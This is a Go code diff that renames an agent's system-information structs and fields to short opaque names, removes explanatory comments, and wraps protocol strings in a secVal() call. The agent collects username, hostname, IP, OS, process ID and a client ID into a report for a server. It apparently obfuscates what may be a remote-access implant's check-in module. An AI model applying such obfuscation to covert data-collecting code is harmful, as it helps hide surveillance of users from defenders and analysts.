@@ -17,37 +17,26 @@ import (
 	"time"
 )
 
-// SystemInfo represents the collected system information
-type SystemInfo struct {
-	// Basic process info
-	PID      int    `json:"pid"`
-	ProcName string `json:"pn"`
 
-	// System identification
-	Username string `json:"un"`
-	Hostname string `json:"hn"`
-
-	// Network info
-	IP string `json:"ip"`
-
-	// System details
-	Architecture string    `json:"ac"`
-	OS           string    `json:"os"`
-	Timestamp    time.Time `json:"ts"`
-
-	// Client identification
-	ClientID string `json:"cl"`
-
-	// Random seed
-	Seed string `json:"seed"`
+type NI struct {
+	PID int    `json:"pid"`
+	PN  string `json:"pn"`
+	UN  string `json:"un"`
+	HN  string `json:"hn"`
+	IP  string `json:"ip"`
+	AC  string `json:"ac"`
+	OS  string `json:"os"`
+	TS  time.Time `json:"ts"`
+	NID string `json:"cl"`
+	SD  string `json:"seed"`
 }
 
-// SystemInfoReport represents the complete report structure
-type SystemInfoReport struct {
-	AgentInfo SystemInfo        `json:"ag"`
-	Metadata  map[string]string `json:"md"`
-	Status    string            `json:"st"`
-	Error     string            `json:"error,omitempty"`
+
+type NR struct {
+	DT NI                `json:"ag"`
+	MD map[string]string `json:"md"`
+	ST string            `json:"st"`
+	ER string            `json:"error,omitempty"`
 }
 
 // getProcessInfo gets the current process ID and name
@@ -164,36 +153,36 @@ func generateSeed() (string, error) {
 	return string(result), nil
 }
 
-// CollectSystemInfo gathers all system information
-func CollectSystemInfo(clientID string) (*SystemInfoReport, error) {
-	info := &SystemInfo{
-		ClientID:  clientID,
+// collectSystemInfo gathers all system information
+func collectSystemInfo(clientID string) (*NR, error) {
+	info := &NI{
+		NID:  clientID,
 		OS:        getOperatingSystem(),
-		Timestamp: time.Now().UTC(),
+		TS:        time.Now().UTC(),
 	}
 
 	var err error
 
 	// Generate seed
-	info.Seed, err = generateSeed()
+	info.SD, err = generateSeed()
 	if err != nil {
 		return nil, fmt.Errorf(ErrCtx(E19, err.Error()))
 	}
 
 	// Get process information
-	info.PID, info.ProcName, err = getProcessInfo()
+	info.PID, info.PN, err = getProcessInfo()
 	if err != nil {
 		return nil, fmt.Errorf(ErrCtx(E19, err.Error()))
 	}
 
 	// Get username
-	info.Username, err = getCurrentUser()
+	info.UN, err = getCurrentUser()
 	if err != nil {
 		return nil, fmt.Errorf(ErrCtx(E19, err.Error()))
 	}
 
 	// Get hostname
-	info.Hostname, err = getHostname()
+	info.HN, err = getHostname()
 	if err != nil {
 		return nil, fmt.Errorf(ErrCtx(E19, err.Error()))
 	}
@@ -205,11 +194,11 @@ func CollectSystemInfo(clientID string) (*SystemInfoReport, error) {
 	}
 
 	// Get architecture
-	info.Architecture = getArchitecture()
+	info.AC = getArchitecture()
 
 	// Create the full report with metadata including JSON field mapping
 	metadata := map[string]string{
-		protoMetaStartup: time.Now().UTC().Format(time.RFC3339),
+		secVal(protoMetaStartup): time.Now().UTC().Format(time.RFC3339),
 	}
 
 	// Add JSON field mapping to metadata so server can decode responses
@@ -219,17 +208,17 @@ func CollectSystemInfo(clientID string) (*SystemInfoReport, error) {
 		metadata["jfm"] = string(fieldMappingJSON)
 	}
 
-	report := &SystemInfoReport{
-		AgentInfo: *info,
-		Metadata:  metadata,
-		Status:    protoMetaActive,
+	report := &NR{
+		DT: *info,
+		MD: metadata,
+		ST: secVal(protoMetaActive),
 	}
 
 	return report, nil
 }
 
-// ToJSON converts the SystemInfoReport to a JSON string
-func (r *SystemInfoReport) ToJSON() (string, error) {
+// toJSON converts to a JSON string
+func (r *NR) toJSON() (string, error) {
 	jsonBytes, err := json.MarshalIndent(r, "", "    ")
 	if err != nil {
 		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
